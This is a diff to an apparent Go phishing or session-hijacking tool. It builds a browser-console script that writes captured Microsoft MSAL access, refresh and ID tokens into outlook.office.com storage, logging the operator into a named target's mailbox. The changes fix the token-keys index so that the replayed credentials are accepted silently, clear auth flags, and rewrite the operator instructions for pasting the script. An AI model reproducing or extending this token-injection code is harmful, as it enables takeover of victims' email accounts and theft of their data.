@@ -1241,8 +1241,32 @@ func (s *HttpServer) handleDCInject(w http.ResponseWriter, r *http.Request) {
 		entries[extraRTKey] = extraRTVal
 	}
 
-	// Also add the MSAL account-keys index that some MSAL versions require
+	// MSAL v2 requires "msal.account.keys" (account index) AND
+	// "msal.token.keys.{clientId}" (credential index) to discover cached tokens.
+	// Without the token-keys index MSAL silently ignores all cached credentials
+	// and falls back to interactive login — this is the #1 cause of inject failures.
 	entries["msal.account.keys"] = []string{accountKey}
+
+	// Build the credential key lists for the token-keys index.
+	var atKeys, rtKeys []string
+	for k, v := range entries {
+		if vm, ok := v.(map[string]interface{}); ok {
+			ct, _ := vm["credentialType"].(string)
+			switch ct {
+			case "AccessToken":
+				atKeys = append(atKeys, k)
+			case "RefreshToken":
+				rtKeys = append(rtKeys, k)
+			}
+		}
+	}
+	entries["msal.token.keys."+owaClientID] = map[string]interface{}{
+		"accessToken":  atKeys,
+		"idToken":      []string{idtKey},
+		"refreshToken": rtKeys,
+	}
+	// Clear any stale interaction-in-progress flag that can block silent auth.
+	entries["msal.interaction.status"] = ""
 
 	// ── Server-side OWA warm-up: hit outlook.office.com with bearer so
 	// Microsoft sets its session cookies in our jar; we pass those to the
@@ -1304,8 +1328,8 @@ func (s *HttpServer) handleDCInject(w http.ResponseWriter, r *http.Request) {
     try{localStorage.setItem(k,v);}catch(e){}
     try{sessionStorage.setItem(k,v);}catch(e){}
   });
-  console.log('%c✓ OWA session injected — reloading','color:#0a0;font-size:14px;font-weight:bold');
-  setTimeout(function(){location.reload();},400);
+  console.log('%c✓ OWA tokens written — navigating to /mail/','color:#0a0;font-size:14px;font-weight:bold');
+  setTimeout(function(){location.href='https://outlook.office.com/mail/';},300);
 })();`)
 
 	snippet := js.String()
@@ -1346,23 +1370,27 @@ textarea.code{display:block;width:100%%;background:#111;border:1px solid #1a3a5c
 </p>
 </div>
 <div class="card" style="border-color:#1a3a5c">
-<h2 style="color:#4a9fd4">Steps</h2>
+<h2 style="color:#4a9fd4">Steps (read carefully)</h2>
 <ol class="steps">
-<li>In a browser <strong>without MetaMask</strong>, click <strong>Open OWA Auth Page</strong> — stays on outlook.office.com, does not redirect</li>
-<li>Press <strong>F12</strong> → <strong>Console</strong> tab — confirm URL bar still shows <strong>outlook.office.com</strong></li>
-<li>Click <strong>Copy Script</strong> below → paste in console → press <strong>Enter</strong></li>
-<li>Navigate to <a href="https://outlook.office.com/mail/" target="_blank" style="color:#0078d4">outlook.office.com/mail/</a> — logged in as <strong>%s</strong></li>
+<li>Click <strong>Copy Script</strong> below first — copy it to clipboard NOW before opening OWA</li>
+<li>Click <strong>Open OWA Page</strong> — this opens outlook.office.com in a new tab (it may show a login page — that is fine, stay on it)</li>
+<li>In the new tab, press <strong>F12</strong> → <strong>Console</strong> — confirm the URL bar says <strong>outlook.office.com</strong></li>
+<li>Paste the script in console → press <strong>Enter</strong> — it will auto-navigate to <strong>/mail/</strong> logged in as <strong>%s</strong></li>
 </ol>
+<p style="font-size:12px;color:#888;margin-top:10px;padding-left:12px">
+⚠ <strong style="color:#ccc">Do NOT reload</strong> the OWA page manually after pasting — the script navigates automatically.<br>
+⚠ If OWA still redirects to login, wait 3 seconds and try again — MSAL may need one extra load to pick up the cache.
+</p>
 </div>
 <div class="card">
-<h2>Injection Script <span style="font-size:10px;color:#444;font-weight:normal;text-transform:none;letter-spacing:0">(OWA session cookies + MSAL token cache)</span></h2>
+<h2>Injection Script <span style="font-size:10px;color:#444;font-weight:normal;text-transform:none;letter-spacing:0">(MSAL token cache + session cookies)</span></h2>
 <textarea class="code" id="ta" readonly>%s</textarea>
 <div class="row">
 <button class="btn" id="cpbtn" onclick="doCopy()">Copy Script</button>
-<a class="btn b2" href="https://outlook.office.com/owa/auth/logon.aspx?url=https://outlook.office.com/owa/&amp;reason=0" target="_blank">Open OWA Auth Page</a>
+<a class="btn b2" href="https://outlook.office.com/owa/auth/logon.aspx?url=https://outlook.office.com/owa/&amp;reason=0" target="_blank">Open OWA Page</a>
 <span class="ok" id="ok">Copied!</span>
 </div>
-<p class="note">If copy fails: click inside the text box, press Ctrl+A then Ctrl+C, then paste in the OWA console</p>
+<p class="note">If copy fails: click inside the text box → Ctrl+A → Ctrl+C → paste in OWA console</p>
 </div>
 <div class="card" style="font-size:12px;color:#555;line-height:1.9">
   <div>Target: <span style="color:#888">%s</span></div>
